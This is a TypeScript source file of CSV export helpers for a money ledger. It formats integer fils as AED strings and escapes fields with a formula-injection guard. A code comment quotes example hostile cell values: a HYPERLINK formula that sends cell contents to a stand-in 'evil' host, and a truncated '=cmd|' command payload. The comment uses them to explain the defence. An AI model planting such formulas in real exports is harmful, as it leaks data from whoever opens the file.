// CSV helpers (task 6.2). Money serializes as plain 2-decimal AED strings
// from INTEGER math (D-18 / §3.3) — no floats, and no thousands
// separators, so spreadsheets parse the column as numeric.

export function filsToCsvAed(fils: number): string {
  const neg = fils < 0;
  const abs = Math.abs(fils);
  return `${neg ? "-" : ""}${Math.floor(abs / 100)}.${String(abs % 100).padStart(2, "0")}`;
}

export function csvField(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";
  let s = String(value);
  // CSV formula-injection guard: Excel/Sheets execute a cell that begins with
  // = + - @ (or a leading control char) as a formula, so a customer named
  // `=HYPERLINK("http://evil"&A1)` or a payment reference like `=cmd|...` would
  // run when the accountant opens an export. Neutralize by prefixing a single
  // quote — but leave plain numeric money values (e.g. "-5.00" reversal rows
  // from filsToCsvAed) alone so the column still parses as numbers.
  if (/^[=+\-@\t\r]/.test(s) && !/^-?\d+(\.\d+)?$/.test(s)) {
    s = "'" + s;
  }
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function csvDocument(header: string[], rows: (string | number | null)[][]): string {
  // \r\n line endings + UTF-8 BOM: what Excel expects.
  const lines = [header, ...rows].map((r) => r.map(csvField).join(","));
  return "﻿" + lines.join("\r\n") + "\r\n";
}
